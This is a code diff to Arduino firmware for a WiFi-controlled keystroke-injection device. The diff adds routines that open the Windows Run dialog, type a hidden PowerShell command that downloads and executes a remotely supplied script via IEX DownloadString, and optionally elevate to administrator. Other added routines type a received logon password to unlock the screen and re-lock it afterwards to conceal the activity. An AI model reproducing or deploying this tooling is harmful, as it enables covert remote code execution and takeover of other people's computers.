@@ -6,9 +6,11 @@
 SoftwareSerial keyboardSerial(9, 7); // RX, TX
 SoftwareSerial wifiSerial(10, 6); //RX, TX
 
-void runCMD(String,bool);
+void runCMD(String, String, String, String);
+void runPowershell(String, String, String, String);
 void writeFile(String, String);
 void runWindows(String);
+void openLock(String, String);
 
 
 
@@ -26,59 +28,16 @@ void setup() {
   wifiSerial.begin(9600);
   keyboardSerial.begin(9600);
   Keyboard.begin(); 
- //runCMD("test",true);keyboardSerial
+ //runCMD("test",true);
    pinMode(wifiStatus, INPUT);
-   
+  
 }
-
-void readIncomingCommand()
-{
-
-
- wifiSerial.listen();
- 
-
-
-  if(wifiSerial.available() > 0) {
-     String command = wifiSerial.readString();
-     Serial.println(command);
-
-   String parsedCommand = "";
-   int dataStartPos = command.indexOf("user");
-   int dataEndPos = command.indexOf("_end_");
-
-   if(dataStartPos > -1 && dataEndPos > -1)
-   {
-    while(dataStartPos < dataEndPos)
-    {
-      parsedCommand += command[dataStartPos];
-
-      dataStartPos++;
-    }
-   }
-   Serial.println("parsed: " + parsedCommand);
-   if(command.indexOf("ps_link") > -1)
-   {   
-    runCMD(parsedCommand,true);
-    wifiStatus = false;
-   }
-   else if(command.indexOf("cmd_command") > -1)
-   {
-    runCMD(parsedCommand,true);
-     wifiStatus = false;
-    
-   }  
-  }
-
-}
-
-
 
 
 
 void loop() {
 
- int wifiSS = analogRead(A0);
+ int wifiSS = analogRead(A1);
  Serial.println(wifiSS);
   
  
@@ -911,16 +870,63 @@ void keyboardPrintTR(String payload){
 void windowsRun(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
-
  Keyboard.releaseAll();
 }
 
-void runCMD(String command, bool isAdmin)
+void runPowershell(String user, String logonP, String eDelay, String ps_command_link, bool d_e)
+{
+ //delay(int(eDelay));
+   if (logonP != "") 
+  openLock("open", logonP);
+ 
+  delay(100);
+  windowsRun();
+  delay(100);   
+
+ if(user == "ADMIN")
+ {
+  
+  if (d_e)
+    keyboardPrintTR("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('" + ps_command_link + "');\"");
+  else
+    keyboardPrintTR("powershell -windowstyle hidden" + ps_command_link);
+  
+ delay(100);
+ Keyboard.press(KEY_LEFT_CTRL);
+ Keyboard.press(KEY_LEFT_SHIFT);
+ Keyboard.press(KEY_RETURN);
+ delay(1000);
+ 
+ Keyboard.press(KEY_LEFT_ARROW);
+ delay(100);
+ Keyboard.releaseAll();
+ Keyboard.write(KEY_RETURN);
+  }
+  else
+  {
+    if (d_e)
+      keyboardPrintTR("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('" + ps_command_link + "');\"");
+    else
+      keyboardPrintTR("powershell -windowstyle hidden" + ps_command_link);
+    delay(100);
+    Keyboard.write(KEY_RETURN);
+  }
+
+ if(logonP != "")
+ openLock("lock", "");
+ 
+}
+void runCMD(String user, String logonP, String eDelay, String cmd_command)
 {
  windowsRun();
  delay(100);
-
- if(isAdmin)
+ if (logonP != "")
+ {
+  openLock("open", logonP);
+ }
+ delay(100);
+ 
+ if(user == "ADMIN")
  {
  keyboardPrintTR("cmd");
  delay(100);
@@ -943,14 +949,14 @@ void runCMD(String command, bool isAdmin)
   delay(300);
   keyboardPrintTR("mode con:cols=20 lines=1");
   Keyboard.write(KEY_RETURN);  
-  keyboardPrintTR(command);
+  //keyboardPrintTR(command);
   
 }
 
-void runWindows(String command, bool)
+void runWindows(String command, bool isAdmin)
 {
   windowsRun();
- delay(100);
+  delay(100);
 
  if(isAdmin)
  {
@@ -974,5 +980,156 @@ void runWindows(String command, bool)
   }
 }
 
+void openLock(String command, String logonP)
+{
+  if(command == "open")
+  {
+  Keyboard.write(KEY_LEFT_ARROW);
+  delay(100);
+  keyboardPrintTR(logonP);
+  Keyboard.write(KEY_RETURN);
+  delay(10);
+  Keyboard.write(KEY_RETURN);
+   delay(10);
+  }
+  else if(command == "lock")
+  {
+    Keyboard.press(KEY_LEFT_GUI);
+    Keyboard.press('l');
+    delay(50);
+    Keyboard.releaseAll();
+  }
+  
+}
+
+void readIncomingCommand()
+{
+
+
+ wifiSerial.listen();
+ 
+
+
+  if(wifiSerial.available() > 0) {
+     String command = wifiSerial.readString();
+     //Serial.println(command);
+
+   String parsedCommand = "";
+   int dataStartPos = command.indexOf("user");
+   int dataEndPos = command.indexOf("_end_");
+
+   String user = "";
+   String logonP = "";
+   String eDelay = "";
+   String ps_link = "";
+   String ps_command = "";
+   
+    //Serial.println("start: " + String(dataStartPos) + "| end: " + String(dataEndPos));
+   if(dataStartPos > -1 && dataEndPos > -1)
+   {
+    while(dataStartPos < dataEndPos)
+    {
+      parsedCommand += command[dataStartPos];      
+      dataStartPos++;
+    }
+   }
+  //
+  parsedCommand += "***";
+   if(parsedCommand.indexOf("user") > -1)
+   {
+    int counter = 5;
+    String flag = "";
+    
+    flag = parsedCommand.substring(parsedCommand.indexOf("user") + counter, parsedCommand.indexOf("user") + (counter + 3));
+    
+    while(flag != "***")
+    {
+      user += flag[0];
+      counter++;
+      flag = parsedCommand.substring(parsedCommand.indexOf("user") + counter, (parsedCommand.indexOf("user") + (counter + 3)));      
+    }
+   }
+   //
+    Serial.println("USER: " + user);
+   if(parsedCommand.indexOf("PASS") > -1)
+   {
+    int counter = 5;
+    String flag = "";
+    
+    flag = parsedCommand.substring(parsedCommand.indexOf("PASS") + counter, parsedCommand.indexOf("PASS") + (counter + 3));
+    
+    while(flag != "***")
+    {
+      logonP += flag[0];
+      counter++;
+      flag = parsedCommand.substring(parsedCommand.indexOf("PASS") + counter, (parsedCommand.indexOf("PASS") + (counter + 3)));      
+    }
+    Serial.println("PASS: " + logonP);    
+   }
+   //
+   if(parsedCommand.indexOf("DELAY") > -1)
+   {
+    int counter = 6;
+    String flag = "";
+    
+    flag = parsedCommand.substring(parsedCommand.indexOf("DELAY") + counter, parsedCommand.indexOf("DELAY") + (counter + 3));
+    
+    while(flag != "***")
+    {
+      eDelay += flag[0];
+      counter++;
+      flag = parsedCommand.substring(parsedCommand.indexOf("DELAY") + counter, (parsedCommand.indexOf("DELAY") + (counter + 3)));      
+    }
+    Serial.println("DELAY: " + eDelay);    
+   }
+   //
+   if(parsedCommand.indexOf("ps_link") > -1)
+   {
+    int counter = 8;
+    String flag = "";
+    
+    flag = parsedCommand.substring(parsedCommand.indexOf("ps_link") + counter, parsedCommand.indexOf("ps_link") + (counter + 3));
+    
+    while(flag != "***")
+    {
+      ps_link += flag[0];
+      counter++;
+      flag = parsedCommand.substring(parsedCommand.indexOf("ps_link") + counter, (parsedCommand.indexOf("ps_link") + (counter + 3)));      
+    }
+    Serial.println("ps_link: " + ps_link);    
+   
+  }
+   //
+  if(parsedCommand.indexOf("ps_command") > -1)
+   {
+    int counter = 11;
+    String flag = "";
+    
+    flag = parsedCommand.substring(parsedCommand.indexOf("ps_command") + counter, parsedCommand.indexOf("ps_command") + (counter + 3));
+    
+    while(flag != "***")
+    {
+      ps_command += flag[0];
+      counter++;
+      flag = parsedCommand.substring(parsedCommand.indexOf("ps_command") + counter, (parsedCommand.indexOf("ps_command") + (counter + 3)));      
+    }
+    Serial.println("ps_command: " + ps_command);   
+  }
+   Serial.println("parsed: " + parsedCommand);
+   //------------------------------
+
+   
+   if(ps_link != "")
+   {        
+    runPowershell(user,logonP, eDelay, ps_link, true);
+    wifiStatus = false;
+   }
+   else if(command.indexOf("cmd_command") > -1)
+   {
+   // runCMD(parsedCommand,true);
+     wifiStatus = false;
+   }  
+}
+}
 
   
